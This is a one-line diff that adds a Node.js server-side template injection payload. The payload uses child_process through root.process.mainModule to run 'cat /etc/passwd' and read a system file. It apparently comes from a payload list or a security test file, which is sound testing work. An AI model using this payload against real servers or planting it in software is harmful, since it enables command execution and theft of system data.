@@ -1,0 +1,1 @@
+#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
